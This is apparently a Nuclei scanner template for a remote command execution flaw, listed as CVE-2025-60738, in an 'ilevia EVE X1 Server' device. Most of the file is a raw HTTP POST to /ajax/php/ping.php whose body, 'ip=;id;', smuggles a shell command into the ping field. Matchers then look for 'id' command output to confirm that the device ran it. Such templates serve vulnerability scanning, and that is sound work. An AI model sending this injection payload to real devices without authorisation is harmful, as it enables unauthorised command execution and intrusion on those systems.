id: ileviaEVEX1Server-ping-rce
info:
  name: ileviaEVEX1Server存在远程命令执行
  author: leadlife
  severity: critical
  description: 
  reference: 
    - https://vip.bdziyi.com/60402/
  classification:
    cve-id: CVE-2025-60738
  metadata:
    verified: true/false
    fofa-query: demo
    tips:
    repair:
    version:
  tags: rce,ileviaEVEX1Server

http:
  - raw:
      - |
        POST /ajax/php/ping.php HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Origin: http://
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: PHPSESSID=
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
        content-type: application/x-www-form-urlencoded
        Referer: http://ip/diagnostic/
        Content-Length: 6

        ip=;id;
        
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "Windows IP"
          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
        condition: or

      - type: status
        status:
          - 200